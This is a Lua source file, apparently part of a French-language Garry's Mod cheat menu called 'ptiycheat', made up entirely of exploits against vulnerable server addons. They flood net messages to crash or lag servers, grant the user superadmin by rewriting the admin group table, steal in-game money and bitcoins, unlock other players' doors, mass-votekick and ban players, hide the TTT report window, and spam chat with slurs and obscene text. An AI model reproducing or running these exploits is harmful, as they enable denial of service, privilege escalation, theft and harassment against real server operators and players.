CHATPRINT("Exploit Trouvé : Crasher #1 [Morpheus.StaffTracker]")
addExploit( "13","Crasher #1", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "crasher1" ) then
timer.Create("crasher1", 0.5, 0, function()
for i=1, 2000 do
net.Start("Morpheus.StaffTracker")
net.SendToServer()
end
end)
--("Crashing Server")
else
timer.Remove("crasher1")
--( "Canceling Crasher" )
end
end)
end

status = ValidNetString("egg")
if (status) then
CHATPRINT("Exploit Trouvé : Recevoir Les Easter Eggs")
addExploit( "14","Recevoir Les Easter Eggs", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") RunConsoleCommand("say", "4bigz")
RunConsoleCommand("cc_egg2")
net.Start("egg")
net.SendToServer()
--("Gave Easter Egg")
end)
end

status = ValidNetString("pplay_deleterow")
if (status) then
CHATPRINT("Exploit Trouvé : Devenir SuperAdmin [pplay_deleterow]")
addExploit( "15","Devenir SuperAdmin", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") local id = LocalPlayer():SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}

net.Start("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
net.Start("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
--("promotion ;)")
end)
end

-- TTT Bypass Report by daddy grampa

local function CheckChild(pan)
local title = "You have been reported! Please answer all your reports."
if !pan || !IsValid(pan) then return end
if pan.GetTitle && pan:GetTitle() == title then
pan:Remove();
print("Removed warning box")
return
end
for k,v in pairs(pan:GetChildren()) do
if v.GetTitle && v:GetTitle() == title then
v:Remove();
print("Removed warning box")
return
end
if #v:GetChildren() > 0 then
CheckChild(v)
end
end
end

if (engine.ActiveGamemode() == "terrortown") then
bypass = 0
CHATPRINT("Exploit Trouvé : TTT Bypass Report")
addExploit( "16","Activer/Désactiver Bypass Report TTT", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if (bypass == 0) then
hook.Add("Think", "remove_ttt_report", function()
local pan = vgui.GetHoveredPanel()
CheckChild(pan)
end)
--("Enabled Report Bypass")
bypass = 1
else
hook.Remove("Think", "remove_ttt_report")
--("Disabled Report Bypass")
bypass = 0
end
end)
end

status = ValidNetString("EZS_PlayerTag")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #3 [EZS_PlayerTag]")
addExploit( "17","Crée Des Lags #3", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger3" ) then
timer.Create("lagger3", 0.5, 0, function()
for k, v in pairs(player.GetAll()) do
net.Start("EZS_PlayerTag",true)
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
timer.Simple(2, function()
net.Start("EZS_PlayerTag",true)
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
end)
end
end)
--("Lags Démarré")
else
timer.Remove("lagger3")
--("Lags Arreté")
end
end)
end

if ConVarExists("advttt_spreadovertime_enabled") then
CHATPRINT("Exploit Trouvé : NoSpread")
addExploit( "18","NoSpread", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") hook.Remove("PlayerTick", "WyoziAdvTTTSpreadOverTime")
--("Spread Removed")
end)
end

status = ValidNetString("fp_as_doorHandler")
if (status) then
CHATPRINT("Exploit Trouvé : Ouvrir Des Portes | Fermer Des Portes | Supprimer Le Propriétaire [fp_as_doorHandler]")
addExploit( "19","Ouvrir La Porte", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") net.Start("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
--("Portes Ouverte")
end)
end

status = ValidNetString("fp_as_doorHandler")
if (status) then
addExploit( "20","Fermer La Porte", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") net.Start("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
--("Portes Ouverte")
end)
end

status = ValidNetString("fp_as_doorHandler")
if (status) then
addExploit( "21","Supprimer Le Propriétaire", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
net.Start("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
--("Portes Ouverte")
end)
end

status = ValidNetString("VJSay")
if (status) then
CHATPRINT("Exploit Trouvé : VJSay [OLD] [VJSay]")
addExploit( "22","VJSay [OLD]", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) inputFrame2Exists = true
inputFrame2 = vgui.Create( "DFrame" )
inputFrame2:SetTitle("Entrer votre message")
inputFrame2:SetSize( 400, 75 )
inputFrame2:SetPos(ScrW() / 2 - inputFrame2:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame2:SetDraggable(true)
inputFrame2:ShowCloseButton(false)
inputFrame2:MakePopup()
inputFrame2.Paint = function( self, w, h )
DrawBlur(self, blur_effect:GetInt())

draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0,230))
end

local TextEntry2 = vgui.Create( "DTextEntry", inputFrame2 )
TextEntry2:SetSize( 380, 30 )
TextEntry2:SetPos( inputFrame2:GetWide() / 2 - TextEntry2:GetWide() / 2, inputFrame2:GetTall() / 2 - TextEntry2:GetTall() / 2 )
TextEntry2:SetText( "Broadcast Msg" )
TextEntry2.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Broadcasting")
net.Start("VJSay")
net.WriteEntity(nil)
net.WriteString(TextEntry2:GetValue())
net.WriteString("")
net.SendToServer()
inputFrame2:SetVisible(false)
end
end)
end

status = ValidNetString("ply_pick_shit")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite amirite [ply_pick_shit]")
addExploit( "23","Argent Gratuite amirite", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") for k, v in pairs (player.GetAll()) do
for i = 1,255 do
net.Start("ply_pick_shit")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.SendToServer()
end
end
--("Des thunes :^)")
end)
end

status = ValidNetString("pac.net.TouchFlexes.ClientNotify")
if (status) then
CHATPRINT("Exploit Trouvé : Faire Crash #2 [pac.net.TouchFlexes.ClientNotify]")
addExploit( "24","Crasher #2", "big lagz", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "crasher2" ) then
timer.Create("crasher2", 0, 0, function()
for i = 1, 400 do
net.Start("pac.net.TouchFlexes.ClientNotify")
net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999999, 13)
net.SendToServer()
end
end)
--("Starting Crasher")
else
timer.Remove("crasher2")
--("Stopping Crasher")
end
end)
end

status = ValidNetString("BM2.Command.SellBitcoins")
if (status) then
CHATPRINT("Exploit Trouvé : Vendre Vos Bitcoins [BM2.Command.SellBitcoins]")
addExploit( "25","Vendre Vos Bitcoins", "sells your and other peoples bitcoins at a great distance", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") for k, v in pairs(ents.FindByClass("bm2_bitminer_1")) do
net.Start("BM2.Command.SellBitcoins")
net.WriteEntity(v)
net.SendToServer()
end
for k, v in pairs(ents.FindByClass("bm2_bitminer_2")) do
net.Start("BM2.Command.SellBitcoins")
net.WriteEntity(v)
net.SendToServer()
end
for k, v in pairs(ents.FindByClass("bm2_bitminer_rack")) do
net.Start("BM2.Command.SellBitcoins")
net.WriteEntity(v)
net.SendToServer()
end
end)
end

status = ValidNetString("BM2.Command.Eject")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #4 [BM2.Command.Eject]")
addExploit( "26","Crée Des Lags #4", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger4" ) then
timer.Create("lagger4", 0, 0, function()
for i = 1, 1000 do
net.Start("BM2.Command.Eject",true)
net.WriteInt(9999999999999999999999999999999999999999999999999999999999999999999999, 8)
net.SendToServer()
end
end)
--("Lags Démarré")
else
timer.Remove("lagger4")
--("Lags Arreté")
end
end)
end

status = ValidNetString("BM2.Command.SellBitcoins")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #5 [BM2.Command.SellBitcoins]")
addExploit( "27","Crée Des Lags #5", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger5", 0, 0, function()
for i=1,1000 do
net.Start("BM2.Command.SellBitcoins",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("ItemStoreUse")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #6 [ItemStoreUse]")
addExploit( "28","Crée Des Lags #6", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger6" ) then
timer.Create("lagger6", 0, 0, function()
for i = 1, 1000 do
net.Start("ItemStoreUse",true)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end)
--("Lags Démarré")
else
timer.Remove("lagger6")
--("Lags Arreté")
end
end)
end

status = ValidNetString("ItemStoreDrop")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #7 [ItemStoreDrop]")
addExploit( "29","Crée Des Lags #7", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger7" ) then
timer.Create("lagger7", 0, 0, function()
for i = 1, 1000 do
net.Start("ItemStoreDrop",true)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end)
--("Lags Démarré")
else
timer.Remove("lagger7")
--("Lags Arreté")
end
end)
end

status = ValidNetString("gMining.sellMineral")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #8 [gMining.sellMineral]")
addExploit( "30","Crée Des Lags #8", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if !timer.Exists( "lagger8" ) then
timer.Create("lagger8", 0, 0, function()
for i = 1, 1000 do
net.Start("gMining.sellMineral",true)
net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 3)
net.WriteString(" ")
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("PlayerUseItem")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #9 [PlayerUseItem]")
addExploit( "31","Crée Des Lags #9", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger9" ) then
timer.Create("lagger9", 0,0, function()
for i = 1, 800 do
net.Start("PlayerUseItem",true)
net.WriteInt(99999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end)
--("Lags Démarré")
else
timer.Remove("lagger9")
--("Lags Arreté")
end
end)
end

status = ValidNetString("RequestMAPSize")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #10 [RequestMAPSize]")
addExploit( "32","Crée Des Lags #10", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger10" ) then
timer.Create("lagger10", 0, 0, function()
for i = 1, 400 do
net.Start("RequestMAPSize",true)
net.SendToServer()
end
end)
--("Lags Démarré")
else
timer.Remove("lagger10")
--("Lags Arreté")
end
end )
end

status = ValidNetString("MG2.Request.GangRankings")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #11 [MG2.Request.GangRankings]")
addExploit( "33","Crée Des Lags #11", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger11" ) then
timer.Create("lagger11", 0, 0, function()
for i = 1, 1000 do
net.Start("MG2.Request.GangRankings",true)
net.SendToServer()
end
end)
--("Lags Démarré")
else
timer.Remove("lagger11")
--("Lags Arreté")
end
end )
end

status = ValidNetString("dLogsGetCommand")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #12 [dLogsGetCommand]")
addExploit( "34","Crée Des Lags #12", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Lags Démarré")
for i=1,7000 do
net.Start("dLogsGetCommand",true)
net.WriteTable({ cmd = "+forward" , args = " " })
net.SendToServer()
end
end )
end

status = ValidNetString("ats_send_toServer")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #13 [ats_send_toServer]")
addExploit( "35","Crée Des Lags #13", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Lags Démarré")
for i=1,2000 do
net.Start("ats_send_toServer",true)
net.WriteTable({ " " , "Open" , nil , nil , nil , nil })
net.SendToServer()
end
end )
end

status = ValidNetString("shopguild_buyitem")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De Guildes [shopguild_buyitem]")
addExploit( "36","Exploit De Guildes", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Guild level successfully upgraded")
local level = tonumber(LocalPlayer():GetNWInt("lvlguild"))
if level > tonumber(LocalPlayer():GetNWInt("lvlguild")) then level = tonumber(LocalPlayer():GetNWInt("lvlguild")) end
net.Start("shopguild_buyitem")
net.WriteString("lvl")
net.WriteDouble(level)
net.WriteString("Guild Level "..level)
net.WriteEntity(LocalPlayer())
net.WriteUInt(2,4)
net.WriteDouble(0)
net.SendToServer()
level = level + 1
end )
end

status = ValidNetString("VoteKickNO")
if (status) then
CHATPRINT("Exploit Trouvé : Votekick [VoteKickNO]")
addExploit( "37","Votekick", "kicking all", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") for k,v in pairs(player.GetAll()) do
net.Start("VoteKickNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(6)
net.SendToServer()
net.Start("VoteKickNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(6)
net.SendToServer()
net.Start("VoteKickNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(6)
net.SendToServer()
net.Start("VoteKickNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(6)
net.SendToServer()
end
end )
end

status = ValidNetString("VoteBanNO")
if (status) then
CHATPRINT("Exploit Trouvé : Voteban [VoteBanNO]")
addExploit( "38","Voteban", "bans all", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") for k,v in pairs(player.GetAll()) do
net.Start("VoteBanNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(8)
net.SendToServer()
net.Start("VoteBanNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(8)
net.SendToServer()
net.Start("VoteBanNO")
net.WriteFloat(v:EntIndex())
net.WriteFloat(8)
net.SendToServer()
end
end )
end

status = ValidNetString("NewReport")
if (status) then
CHATPRINT("Exploit Trouvé : Report Modifié [NewReport]")
addExploit( "39","Report Modifié", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") for k,v in pairs(player.GetAll()) do
net.Start("NewReport")
net.WriteType(ply)
net.WriteInt(8,5)
net.WriteString("hahaha")
net.SendToServer()
end
end )
end

status = ValidNetString("Warn_CreateWarn")
if (status) then
CHATPRINT("Exploit Trouvé : Warns Modifiés [Warn_CreateWarn]")
addExploit( "40","Warns Modifiés", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") for k,v in pairs(player.GetAll()) do
net.Start("Warn_CreateWarn")
net.WriteEntity(ply)
net.WriteString("hahaha")
net.SendToServer()
end
end )
end

status = ValidNetString("showDisguiseHUD")
if (status) then
CHATPRINT("Exploit Trouvé : Déguisements #2 [showDisguiseHUD]")
addExploit( "41","Déguisements #2", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" )
PlayerCount = 0
for k, v in pairs(player.GetAll()) do
PlayerCount = PlayerCount + 1
end
local TeamNum
local disguise_Model_Preview_Default
local BDMenu = vgui.Create("DFrame")
BDMenu:SetSize(300,420)
BDMenu:Center()
BDMenu:SetTitle(" ")
BDMenu:ShowCloseButton(false)
BDMenu:MakePopup()
function BDMenu:Paint()
DrawBlur(self, blur_effect:GetInt())
draw.RoundedBoxEx( 0, 0, 0, BDMenu:GetWide(), BDMenu:GetTall(), Color(20,20,20,200),false,true)
draw.RoundedBox( 5, 0, 0, 5, h, Color( 20, 20, 20, 60 ) )
draw.RoundedBox( 5, 0, 0, w, 5, Color( 20, 20, 20, 60 ) )
draw.RoundedBox( 5, w - 5, 0, 5, h, Color( 20, 20, 20, 60 ) )
draw.RoundedBox( 5, 0, h - 5, w, 5, Color( 20, 20, 20, 60 ) )
end
local ExitButton = vgui.Create("DButton", BDMenu)
ExitButton:SetPos(280,0)
ExitButton:SetText("X")
ExitButton:SetSize(20,20)
ExitButton:SetFont("Default")
ExitButton.Paint = function()
ExitButton:SetTextColor(Color(255,255,255,255))
if ExitButton:IsHovered() then
draw.RoundedBoxEx(0,0,0, ExitButton:GetWide(), ExitButton:GetTall(), Color(255,100,100,255),false,true)
else
draw.RoundedBoxEx(0,0,0, ExitButton:GetWide(), ExitButton:GetTall(), Color(255,50,50,0),false,true)
end
end
function ExitButton.DoClick()
BDMenu:Remove()
net.Start("changeToPhysgun")
net.SendToServer()
end
local DTeamChoice = vgui.Create("DComboBox", BDMenu)
DTeamChoice:SetSize(150, 22)
DTeamChoice:SetPos(75, 50)
DTeamChoice:SetValue("Choisi L'Emplois")
for k, v in pairs(team.GetAllTeams()) do
if !(HIDDEN_TEAMS[ k ] ) and (team.NumPlayers(k) ~= 0) then DTeamChoice:AddChoice(team.GetName(k)) end
end
DTeamChoice.OnSelect = function(panel, index, value)
for k,_ in pairs(team.GetAllTeams()) do
if value == team.GetName(k) then
for _, v in pairs(player.GetAll())do
if v:Team() == k then
TeamNum = v:Team()
disguise_Model_Preview_Default = v:GetModel()
end
end
end
end
timer.Create("RefreshModel", 0.1, 0, function()
local icon = vgui.Create( "DModelPanel", BDMenu )
icon:SetSize(300, 260)
icon:SetPos(-5, 80)
icon:SetFOV(68)
icon:SetModel( disguise_Model_Preview_Default )
timer.Simple(0.1, function()
icon:Remove()
end)
end)
local DisguiseButton = vgui.Create("DButton", BDMenu)
DisguiseButton:SetPos(BDMenu:GetWide()/2.5, 360)
DisguiseButton:SetSize(60,20)
DisguiseButton:SetText("Accepter")
DisguiseButton:SetFont("DermaDefaultBold")
function DisguiseButton:Paint()
if DisguiseButton:IsHovered() then
draw.RoundedBoxEx(0,0,0, ExitButton:GetWide(), ExitButton:GetTall(), Color(255,100,100,255),false,true)
else
draw.RoundedBoxEx(0,0,0, ExitButton:GetWide(), ExitButton:GetTall(), Color(255,50,50,255),false,true)
end
end
function DisguiseButton:DoClick()
NOTIFICATION("Exploit lançé")
net.Start("SetPlayerModel")
if ChosenName == nil then
net.WriteString(LocalPlayer():Nick())
else
net.WriteString(ChosenName)
end
net.WriteUInt(TeamNum, 16)
net.SendToServer()
BDMenu:Close()
net.Start("changeToPhysgun")
net.SendToServer()
end
end
end
)
end

status = ValidNetString("Chatbox_PlayerChat")
if (status) then
CHATPRINT("Exploit Trouvé : Spam Chat [Chatbox_PlayerChat]")
addExploit( "42","Spam Chat", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("willoxchatspam", 1, 0, function()
net.Start("Chatbox_PlayerChat")
net.WriteEntity(LocalPlayer())
net.WriteBit(1)
net.WriteString("FAGGOTS")
net.WriteBit(1)
net.SendToServer()
end )
end )
end

status = ValidNetString("BuilderXToggleKill")
if (status) then
CHATPRINT("Exploit Trouvé : Exploits Constructeur Contre Tueur [BuilderXToggleKill]")
addExploit( "43","Exploits Constructeur Contre Tueur", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(player.GetAll()) do
net.Start("BuilderXToggleKill")
net.WriteEntity(ply)
net.SendToServer()
end
end )
end

status = ValidNetString("reports.submit")
if (status) then
CHATPRINT("Exploit Trouvé : Report Tout Le Monde [reports.submit]")
addExploit( "44","Report Tout Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("reports.submit")
net.WriteEntity(v)
net.WriteInt(5, 8)
net.WriteString("SuckMyDick")
net.SendToServer()
end
end )
end

status = ValidNetString("services_accept")
if (status) then
CHATPRINT("Exploit Trouvé : Spam Services [services_accept]")
addExploit( "45","Spam Services", "spam to all players", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("serviceaccept", 0, 0, function()
for k,v in pairs(player.GetAll()) do
net.Start("services_accept")
net.WriteString("Sécurité En Carton - Seized By ptiycheat")
net.WriteVector(Vector(v:GetPos()))
net.WriteString("test image")
net.WriteEntity(v)
net.SendToServer()
end
end )
timer.Simple(4, function()
timer.Destroy("serviceaccept")
end )
end )
end

status = ValidNetString("lockpick_sound")
if (status) then
CHATPRINT("Exploit Trouvé : LockPick Spam Son [lockpick_sound]")
addExploit( "46","LockPick Spam Son", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create( "spamlockpicksound", 3, 0, function()
for k, v in pairs( player.GetAll() ) do
net.Start("lockpick_sound")
net.WriteEntity(v)
net.SendToServer()
end
end )
timer.Simple(4, function()
timer.Destroy("spamlockpicksound")
end )
end )
end

status = ValidNetString("customprinter_get")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'Argents Des Printers [customprinter_get]")
addExploit( "47","Voler L'Argents Des Printers", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
if v:GetClass():find("print") then
net.Start("customprinter_get")
net.WriteEntity(v)
net.WriteString("g_money")
net.SendToServer()
end
end
end )
end

status = ValidNetString("InformPlayer")
if (status) then
CHATPRINT("Exploit Trouvé : SimpleGrab Inform [InformPlayer]")
addExploit( "48","SimpleGrab Inform", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
for i = 0, 100 do
net.Start("InformPlayer")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("pogcp_report_submitReport")
if (status) then
CHATPRINT("Exploit Trouvé : Report Tout Le Monde #2 [pogcp_report_submitReport]")
addExploit( "49","Report Tout Le Monde #2", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for i = 0, 100 do
for k,v in pairs(player.GetAll()) do
net.Start("pogcp_report_submitReport")
net.WriteString("lol")
net.WriteString("88 Triggering :c")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("1942_Fuhrer_SubmitCandidacy")
if (status) then
CHATPRINT("Exploit Trouvé : Candidature De Dictateur Instant [1942_Fuhrer_SubmitCandidacy]")
addExploit( "50","Candidature De Dictateur Instant", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("1942_Fuhrer_SubmitCandidacy")
net.WriteString(LocalPlayer():Nick())
net.SendToServer()
end )
end

status = ValidNetString("FacCreate")
if (status) then
CHATPRINT("Exploit Trouvé : Fac Create [FacCreate]")
addExploit( "51","Fac Create", "old exploit", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("fucklol", 1, 0, function()
net.Start("FacCreate")
net.WriteString("LOL " .. random_string(5))
net.WriteString("LOL " .. random_string(10))
net.WriteColor(random_color())
net.WriteBool(false)
net.WriteString(random_string(5))
net.SendToServer()
end )
end )
end

status = ValidNetString("FactionInviteConsole")
if (status) then
CHATPRINT("Exploit Trouvé : Faction Invite [FactionInviteConsole]")
addExploit( "52","Faction Invite", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lovedarkexploitsxd", 1, 0, function()
for k, v in pairs(player.GetAll()) do
net.Start("FactionInviteConsole")
net.WriteEntity( ply )
net.WriteEntity(table.Random(player.GetAll()))
net.SendToServer()
end
end )
end )
end

status = ValidNetString("WithdrewBMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #2 [WithdrewBMoney]")
addExploit( "53","Argent Gratuite #2", "Exploit Provenant De L'addon 'business'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("WithdrewBMoney")
net.WriteInt(50000,32)
net.SendToServer()
end )
end

status = ValidNetString("deathrag_takeitem")
if (status) then
CHATPRINT("Exploit Trouvé : Items Faciles [deathrag_takeitem]")
addExploit( "54","Items Faciles", "collects money, weapons", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
count = 0
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "prop_ragdoll" then
count = count + 1
end
end
if count == 0 then
CHATPRINT("No items found")
else
CHATPRINT("Amount of items "..count)
end
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "prop_ragdoll" then
for i=1,10 do
net.Start("deathrag_takeitem")
net.WriteEntity( v )
net.WriteInt(i,16)
net.SendToServer()
end
end
end
end )
end

status = ValidNetString("REPPurchase")
if (status) then
CHATPRINT("Exploit Trouvé : Heal & Armure [REPPurchase]")
addExploit( "55","Heal & Armure", "armor and hp", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if LocalPlayer():Health() < 99 then
net.Start("REPPurchase")
net.WriteString("HEALTH")
net.SendToServer()
end
if LocalPlayer():Armor() < 99 then
net.Start("REPPurchase")
net.WriteString("ARMOR")
net.SendToServer()
end
end )
end

status = ValidNetString("BTTTStartVotekick")
if (status) then
CHATPRINT("Exploit Trouvé : Votekick #2 [BTTTStartVotekick]")
addExploit( "56","Votekick #2", "kick all noobs", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("BTTTStartVotekick")
net.Start("_nonDBVMVote")
net.WriteEntity(v)
net.WriteString("")
net.WriteString("1")
net.SendToServer()
end
end
end )
end

status = ValidNetString("Resupply")
if (status) then
CHATPRINT("Exploit Trouvé : ReSpawn Equipment [Resupply]")
addExploit( "57","ReSpawn Equipment", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("Resupply")
net.SendToServer()
end )
end

status = ValidNetString("DarkRP_Defib_ForceSpawn")
if (status) then
CHATPRINT("Exploit Trouvé : ReSpawn [DarkRP_Defib_ForceSpawn]")
addExploit( "58","ReSpawn #2", "just reSpawn", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("ReSpawn")
net.Start("DarkRP_Defib_ForceSpawn")
net.SendToServer()
end )
end

status = ValidNetString("FiremanLeave")
if (status) then
CHATPRINT("Exploit Trouvé : Quitter Les Pompiers [FiremanLeave]")
addExploit( "59","Fireman Leave", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("FiremanLeave")
net.SendToServer()
end )
end

status = ValidNetString("PoliceJoin")
if (status) then
CHATPRINT("Exploit Trouvé : Rejoindre La Police [PoliceJoin]")
addExploit( "60","Join the Police 1", "joining the police", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("PoliceJoin")
net.SendToServer()
end )
end

status = ValidNetString("CreateEntity")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Une Entité [CreateEntity]")
addExploit( "61","Create Entity", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("CreateEntity")
net.WriteString("sent_arc_atm")
net.WriteFloat(100000000000000000000000000000000000000000000000000)
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("CREATE_REPORT")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Reports [CREATE_REPORT]")
addExploit( "62","CREATE REPORT", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
local tab = {
REPORTER = v:Nick(),
REPORTERID = v:SteamID(),
FAGGOT = v:Nick(),
FAGGOTID = v:SteamID(),
INFO = "Dite Bonjour A YouTube :D",
PROOF = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
}
